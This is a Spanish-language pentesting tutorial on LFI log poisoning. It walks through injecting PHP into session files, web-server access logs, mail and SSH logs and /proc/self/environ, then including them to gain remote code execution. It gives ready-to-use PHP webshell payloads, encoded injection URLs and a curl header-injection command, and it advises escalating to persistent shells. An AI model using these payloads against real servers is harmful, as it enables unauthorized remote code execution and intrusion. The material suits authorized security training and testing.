
**Cómo convertir archivos de logs en webshells gracias a vulnerabilidades de inclusión de archivos.**

---

# **1. Idea general del ataque**

El log poisoning consiste en **inyectar código ejecutable en cualquier archivo de log** generado por la aplicación o por el servidor.  
Luego, ese archivo contaminado se “incluye” a través de un **LFI ejecutable**, y PHP (u otro lenguaje) interpreta el payload.

La cadena de ataque es:

1. Encontrar LFI con ejecución (`include`, `require`, etc.)
    
2. Identificar **un fichero de log legible** por el servidor web
    
3. Inyectar PHP en una entrada controlada
    
4. Acceder al log mediante el LFI
    
5. Ejecutar comandos (`&cmd=id`) u obtener RCE persistente
    

---

# **2. Funciones de inclusión peligrosas**

|Lenguaje|Función|Lee|Ejecuta|HTTP remoto|
|---|---|---|---|---|
|**PHP**|include / require|✔|✔|depende|
|**Node.js**|res.render (plantillas)|✔|✔|✖|
|**Java**|includes en JSP / imports|✔|✔|✔|
|**.NET**|includes de Razor / views|✔|✔|✔|

Si ejecuta código → vulnerable.

---

# **3. Tipos de log poisoning**

Hay dos categorías principales:

1. **Poisoning de sesiones PHP** (Session files)
    
2. **Poisoning de logs de servicios** (Apache, Nginx, SSH, FTP, correo, etc.)
    

Ambos tienen el mismo objetivo:  
**colocar PHP en un archivo que luego será interpretado vía LFI.**

---

# **4. Session Poisoning (PHPSESSID)**

## **4.1 Cómo funciona PHP con las sesiones**

En PHP, cada cookie `PHPSESSID` se almacena en un archivo real:

- Linux: `/var/lib/php/sessions/sess_<ID>`
    
- Windows: `C:\Windows\Temp\sess_<ID>`
    

Ejemplo:  
Cookie: `PHPSESSID=7c1frl29f4a2k11k99me9j3s90`  
→  
Archivo de sesión:  
`/var/lib/php/sessions/sess_7c1frl29f4a2k11k99me9j3s90`

Estos archivos contienen datos serializados que PHP recupera automáticamente.

Muy importante: **si algún campo del archivo lo controla el usuario, podemos meter PHP dentro.**

---

## **4.2 Comprobación del contenido del session file**

Con LFI:

```
http://victima/app/index.php?page=/var/lib/php/sessions/sess_7c1frl29f4a2k11k99me9j3s90
```

Si puedes leerlo → sigues.

Dentro suelen aparecer valores tipo:

```
page|s:8:"home.php";lang|s:2:"en";
```

Buscamos uno **editable por URL o parámetro**.

---

## **4.3 Envenenar el valor controlado**

Supongamos que el parámetro vulnerable es `page`:

```
http://victima/app/index.php?page=texto_controlado
```

Y al ver la sesión aparece:

```
page|s:17:"texto_controlado";
```

Entonces podemos inyectar un payload PHP:

```
<?php echo shell_exec($_GET['x']); ?>
```

Codificado:

```
%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22x%22%5D%29%3B%3F%3E
```

Lanzamos:

```
http://victima/app/index.php?page=%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%22x%22%5D%29%3B%3F%3E
```

Esto **escribe el webshell dentro del archivo de sesión**.

---

## **4.4 Disparo del código (RCE)**

Usamos LFI para incluir el session file:

```
http://victima/app/index.php?page=/var/lib/php/sessions/sess_7c1frl29f4a2k11k99me9j3s90&x=id
```

→ ejecútalo tantas veces como quieras, pero ojo:  
**cada petición vuelve a sobrescribir la sesión**, por lo que el payload puede desaparecer.

Por eso, lo recomendable es:

- subir un archivo shell al servidor usando el payload
    
- o lanzar una reverse shell
    
- o modificar un archivo localmente accesible
    

---

# **5. Server Log Poisoning**

Este es el ataque habitual en máquinas reales.  
Cualquier log que:

1. podamos leer por LFI
    
2. registre algo controlado por el usuario
    

→ puede transformarse en webshell.

---

# **6. Poisoning de Apache / Nginx**

## **6.1 Ubicaciones típicas**

**Apache**

- `/var/log/apache2/access.log`
    
- `/var/log/apache2/error.log`
    
- (Windows) `C:\xampp\apache\logs\access.log`
    

**Nginx**

- `/var/log/nginx/access.log`
    
- `/var/log/nginx/error.log`
    

Con LFI:

```
?page=/var/log/nginx/access.log
```

Si se ve contenido → vulnerable.

---

# **6.2 ¿Qué parte del log controlamos?**

Principalmente:

- User-Agent
    
- Referer
    
- URI
    
- Path
    
- A veces parámetros de query
    

Por ejemplo, el User-Agent se registra así:

```
"GET / HTTP/1.1" 200 "-" "Mozilla/5.0"
```

Si cambiamos User-Agent a:

```
<?php system($_GET['cmd']); ?>
```

Eso acabará en el log.

---

# **6.3 Inyectar payload en User-Agent**

En Burp:

```
User-Agent: <?php echo shell_exec($_GET['cmd']); ?>
```

O por terminal (ejemplo modificado):

```bash
echo -n "User-Agent: <?php passthru(\$_GET['cmd']); ?>" > ua.txt
curl -s http://victima/ -H @ua.txt
```

---

# **6.4 Ejecutar comandos vía LFI**

```
http://victima/app/index.php?page=/var/log/nginx/access.log&cmd=id
```

Si el log es legible por el usuario del servidor web → RCE directa.

---

# **7. Otros logs explotables**

Cualquier servicio cuyos logs:

- podamos leer
    
- registren datos controlables
    

→ es susceptible a log poisoning.

Ejemplos:

|Servicio|Ruta típica|Control del usuario|
|---|---|---|
|SSH|`/var/log/sshd.log`|username|
|FTP (vsftpd)|`/var/log/vsftpd.log`|usuario/argumentos|
|Mail|`/var/log/mail.log`|remitente/asunto|
|Cron|dependiendo del sistema|comandos|
|Aplicaciones específicas|rutas variables|cualquier input registrado|

Ejemplo creativo:  
Enviar un correo a la aplicación con asunto:

```
<?php echo system($_GET['cmd']); ?>
```

Después incluir el log de correo y ejecutar.

---

# **8. /proc/self/environ y file descriptors**

Si los logs no son legibles, otro truco es incluir:

- `/proc/self/environ`
    
- `/proc/self/fd/<número>`
    

A veces contienen el User-Agent tal cual lo enviamos.

Ejemplo:

```
?page=/proc/self/environ&cmd=id
```

o

```
?page=/proc/self/fd/3&cmd=uname -a
```

**No siempre funciona**, pero salva auditorías cuando Apache tiene logs protegidos.

---

# **9. Buenas prácticas del pentester**

- Probar varios logs: access, error, mail, ssh, ftp, webapp.
    
- Reducir tamaño de log → usar un path específico o session logs.
    
- En servidores pesados, usar `Range:` para no cargar todo el log.
    
- Si la ejecución es inestable, escribir una reverse shell persistente.
    
- Hacer fuzzing de rutas de log cuando no estén en rutas estándar.
    

---

# **10. Esquema mental final del ataque**

```
1. Hay LFI ejecutable → include() vulnerable
2. Buscar archivo de log legible
3. Inyectar PHP en parte controlable (UA, referer, username, etc.)
4. Incluir el log con el LFI
5. Ejecutar &cmd=<comando>
6. Escalar a webshell persistente / reverse shell
